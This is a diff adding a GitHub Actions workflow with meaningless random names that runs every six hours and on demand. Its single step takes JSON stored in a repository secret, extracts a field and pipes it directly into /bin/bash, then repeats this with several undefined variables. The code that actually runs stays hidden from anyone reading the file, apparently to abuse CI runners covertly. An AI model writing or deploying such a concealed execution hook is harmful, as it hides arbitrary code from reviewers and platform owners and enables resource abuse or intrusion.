@@ -1,0 +1,19 @@
+name: lunarsadie65
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lunarsadie65
+        env:
+          ae55: ${{ secrets.ae55 }}
+        run: |
+          echo $ae55 | jq -r .qs8 | /bin/bash
+          echo $zk1 | jq -r .y13960 | /bin/bash
+          echo $izmc51834 | jq -r .wja195 | /bin/bash
+          echo $mp11 | jq -r .g0183 | /bin/bash
+
